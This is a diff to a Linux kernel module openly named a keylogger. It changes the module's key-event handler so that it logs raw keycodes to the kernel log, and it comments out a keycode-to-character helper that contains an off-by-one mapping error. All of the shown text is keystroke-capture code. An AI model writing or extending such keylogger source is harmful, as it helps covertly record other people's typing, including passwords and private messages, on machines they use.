@@ -11,29 +11,29 @@ MODULE_VERSION("1.0");
 
 static struct input_handler keylogger_handler;
 
-static char keycode_to_char(unsigned int code) {
-    if (code >= KEY_1 && code <= KEY_9) {
-        return '0' + (code - KEY_1);  
-    }
-    if (code == KEY_0) {
-        return '0';
-    }
-    if (code >= KEY_A && code <= KEY_Z) {
-        return 'A' + (code - KEY_A); 
-    }
-    if (code == KEY_SPACE) {
-        return ' '; 
-    }
-    if (code == KEY_ENTER) {
-        return '\n';  
-    }
+// static char keycode_to_char(unsigned int code) {
+//     if (code >= KEY_1 && code <= KEY_9) {
+//         return '0' + (code - KEY_1);  
+//     }
+//     if (code == KEY_0) {
+//         return '0';
+//     }
+//     if (code >= KEY_A && code <= KEY_Z) {
+//         return 'A' + (code - KEY_A); 
+//     }
+//     if (code == KEY_SPACE) {
+//         return ' '; 
+//     }
+//     if (code == KEY_ENTER) {
+//         return '\n';  
+//     }
     
-    return '\0';  
-}
+//     return '\0';  
+// }
 
 static void keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
     if (type == EV_KEY && value == 1) { 
-        printk(KERN_INFO "Key pressed: %u\n", keycode_to_char(code));
+        printk(KERN_INFO "Key pressed: %u\n", code);
     }
 
 }
